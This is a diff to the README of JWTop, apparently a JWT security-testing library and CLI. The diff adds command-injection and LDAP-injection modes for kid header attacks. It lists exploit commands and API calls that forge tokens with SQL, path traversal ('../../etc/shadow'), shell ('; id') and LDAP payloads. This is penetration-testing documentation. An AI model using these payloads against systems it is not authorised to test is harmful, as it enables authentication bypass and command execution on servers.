@@ -42,7 +42,7 @@ JWTop is a Go library and CLI for working with JSON Web Tokens. It covers the fu
 | Null signature | ✓ | ✓ |
 | HMAC confusion (RSA/EC → HMAC) | ✓ | ✓ |
 | Psychic signature (ECDSA r=0, s=0) | ✓ | ✓ |
-| kid injection (SQL, path traversal, raw) | ✓ | ✓ |
+| kid injection (SQL, path traversal, command, LDAP, raw) | ✓ | ✓ |
 | JWK header injection (CVE-2018-0114) | ✓ | ✓ |
 
 ---
@@ -282,6 +282,8 @@ jwtop crack <token> --url <url> [--expected-status <n>] [--key <pem-file>] [--wo
 
 **Online-only checks** (require `--url`): `algnone` (×4 casing variants), `hmacconfusion` (requires `--key`), `psychicsig` (ECDSA-only), `kidinjection` (SQL and path traversal), `jwkinjection` (RSA/ECDSA-only, CVE-2018-0114).
 
+> Command and LDAP kid injection (`jwtop exploit kidinjection --mode command|ldap`) are exploit-only for now — the `crack` server probe does not yet include these two techniques.
+
 ```sh
 # Offline — detect cryptographic weaknesses
 jwtop crack $TOKEN
@@ -386,16 +388,23 @@ jwtop exploit kidinjection --mode sql $TOKEN                              # SQL 
 jwtop exploit kidinjection --mode sql --sql-table keys $TOKEN             # SQL injection (custom table)
 jwtop exploit kidinjection --mode path $TOKEN                             # path traversal to /dev/null
 jwtop exploit kidinjection --mode path --path /proc/sys/kernel/ns_last_pid $TOKEN  # custom path
+jwtop exploit kidinjection --mode command $TOKEN                         # shell metacharacter payload ("; id")
+jwtop exploit kidinjection --mode command --all $TOKEN                   # one token per shell payload variant
+jwtop exploit kidinjection --mode ldap $TOKEN                            # LDAP filter injection payload
+jwtop exploit kidinjection --mode ldap --all $TOKEN                      # one token per LDAP payload variant
 jwtop exploit kidinjection --mode raw --kid "../../etc/passwd" --secret "" $TOKEN
 ```
 
+`command` mode targets servers that shell out using the `kid` value to locate a key file (e.g. `openssl ... -in keys/$kid.pem`). `ldap` mode targets servers that interpolate the `kid` value into an LDAP search filter to resolve a signing key (e.g. `(&(objectClass=key)(kid=$kid))`).
+
 | Flag | Description |
 |------|-------------|
-| `--mode` | `sql`, `path`, or `raw` (default `sql`) |
+| `--mode` | `sql`, `path`, `command`, `ldap`, or `raw` (default `sql`) |
 | `--kid` | Override the kid value |
 | `--secret` | HMAC secret to sign with (overrides mode default) |
 | `--sql-table` | Table name for `sql` mode payload (default `tokens`) |
 | `--path` | File path for `path` mode payload (default `/dev/null`) |
+| `--all` | With `command` or `ldap` mode, print one token per known payload variant |
 
 **jwkinjection** — generates a self-signed RSA/ECDSA key pair, embeds the public key directly in the token's `jwk` header field, and re-signs with the matching private key (CVE-2018-0114). Servers that trust an embedded `jwk` instead of validating against a known keyset accept the forged token.
 
@@ -537,6 +546,10 @@ token, err   = exploit.NullSignature(tokenString)
 token, err   = exploit.HMACConfusion(tokenString, pubPEM)
 token, err   = exploit.KidSQLInjection(tokenString, exploit.DefaultKidSQLPayload, []byte("secret"))
 token, err   = exploit.KidPathTraversal(tokenString, exploit.DefaultKidPathTraversalPayload, []byte(""))
+token, err   = exploit.KidCommandInjection(tokenString, exploit.DefaultKidCommandInjectionPayload, []byte(""))
+tokens, err  = exploit.KidCommandInjectionAll(tokenString, []byte(""))  // one token per shell payload variant
+token, err   = exploit.KidLDAPInjection(tokenString, exploit.DefaultKidLDAPInjectionPayload, []byte(""))
+tokens, err  = exploit.KidLDAPInjectionAll(tokenString, []byte(""))     // one token per LDAP payload variant
 token, err   = exploit.KidInjection(tokenString, "../../etc/shadow", jwtlib.SigningMethodHS256, []byte(""))
 token, err   = exploit.JWKInjection(tokenString, jwtlib.SigningMethodRS256)                    // generates key pair
 token, err   = exploit.JWKInjectionWithKey(tokenString, jwtlib.SigningMethodRS256, privateKey) // use existing key
